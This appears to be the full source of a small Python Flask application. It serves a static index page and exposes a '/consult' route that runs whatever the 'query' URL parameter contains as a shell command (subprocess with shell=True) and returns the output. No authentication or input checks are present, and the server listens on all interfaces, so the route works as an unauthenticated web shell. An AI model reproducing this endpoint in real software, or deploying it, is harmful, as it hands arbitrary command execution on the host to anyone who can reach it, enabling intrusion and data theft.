from flask import Flask, request, send_from_directory
import subprocess
import os

app = Flask(__name__)

@app.route("/")
def index():
    return send_from_directory("static", "index.html")

@app.route("/consult")
def consult():
    query = request.args.get("query", "")
    try:
        output = subprocess.check_output(query, shell=True, stderr=subprocess.STDOUT)
        return f"<pre>{output.decode()}</pre>"
    except subprocess.CalledProcessError as e:
        return f"<pre>{e.output.decode()}</pre>"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8000))
    app.run(host="0.0.0.0", port=port)
